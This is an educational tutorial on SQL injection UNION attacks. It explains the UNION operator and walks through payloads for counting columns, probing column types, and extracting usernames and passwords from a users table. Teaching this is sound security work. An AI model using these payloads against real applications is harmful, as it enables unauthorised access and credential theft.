SQL injection UNION attacks are a type of SQL injection that utilize the `UNION` operator. In SQL, the `UNION` operator can be used to combine the results of multiple `SELECT` statements into one.

# UNION operator
Imagine a database for a company. You are given the task of selecting the first name of all the employees in the `employee` table, so you run the following query:
`SELECT first_name FROM employee;`
If you are tasked with getting the first name of each employee in the `employee` table as well as all of the business branches from the `branch` table. You can do this with the following queries:
`SELECT first_name FROM employee;`
`SELECT branch_name FROM branch;`

However, if you want to combine all of the entries into one result list, you can use the `UNION` operator. The following query will get the proper results:
`SELECT first_name FROM employee UNION SELECT branch_name FROM branch;`
This is basically the two previous queries with the `UNION` operator in between.

There are a few rules for the `UNION` operator, however:
1. You have to get the same number of columns in each `SELECT` statement. In the example above, only one column was grabbed from each table. If you had also grabbed the `last_name` column, there would have been an error.
	- The following would error:
	- `SELECT first_name, last_name FROM employee UNION select branch_name FROM branch;`
2. All the results must have a similar data type. In the example above, all of the results were strings. If you had grabbed the `employee_id` column instead of the `first_name` column, there would have been an error.
	- The following would error:
	- `SELECT employee_id FROM employee UNION select branch_name FROM branch;`

# Gathering information
In order for a UNION attack to work, you need to address the two rules mentioned above. To do this, you need some information:
- How many columns are being returned in the original query?
- Which columns of the query are which data type?

### Determining the number of columns
The first method is injecting a series of `ORDER BY` clauses. `ORDER BY` will sort the results based on the nth column, so you can increase the column used as the sorting key until an error is returned. For example, the query `SELECT * FROM tablename ORDER BY 2;` will sort the results by the second column, either alphabetically or numerically. If there is only one column, you will see an error.

For example, take an SQL injection that exists at a quoted string. You could inject the following until an error is returned:
`' ORDER BY 1--`
`' ORDER BY 2--`
`' ORDER BY 3--`
and so on.

The second method is using multiple `NULL` payloads. Just `SELECT` a different amount of `NULLs` until an error does NOT occur:
`' UNION SELECT NULL--`
`' UNION SELECT NULL,NULL--`
`' UNION SELECT NULL,NULL,NULL--`
Eventually you will not receive an error. Keep in mind that on Oracle databases, you need to `SELECT` from a specified table. This can be done from a table called `DUAL`, which is present in all Oracle databases. An example of this when using an Oracle database might be `' UNION SELECT NULL,NULL FROM DUAL--`.

### Determining column datatype
Once you determine the number of columns, you need to find a column with the datatype of the data you are trying to find. For example, if you are trying to get the passwords to be printed, you will want to find a column with the string datatype.

This can be done with `UNION SELECT`. You will want to probe each individual column:
`' UNION SELECT 'a',NULL,NULL,NULL--`
`' UNION SELECT NULL,'a',NULL,NULL--`
`' UNION SELECT NULL,NULL,'a',NULL--`
`' UNION SELECT NULL,NULL,NULL,'a'--`
When you don't receive an error, the column is a suitable datatype.

# Retrieving data
### Basics
Suppose that a query returns two columns, both of which can hold string data. You can test to see if the following works:
`' UNION SELECT username, password FROM users--`
If successful, this will return logins in addition to the normal data.

### From a single column
Sometimes, you will only have one column being returned, but you want multiple columns worth of data. This can be done by concatenating the values. For example, you could do the following:
`' UNION SELECT username || '~' || password FROM users--`
Which will return usernames and passwords split with the `~` symbol. Keep in mind that different databases use different concatenation symbols. Oracle and PostgreSQL use `||`while Microsoft uses `+` and MySQL uses a space or the `CONCAT` function.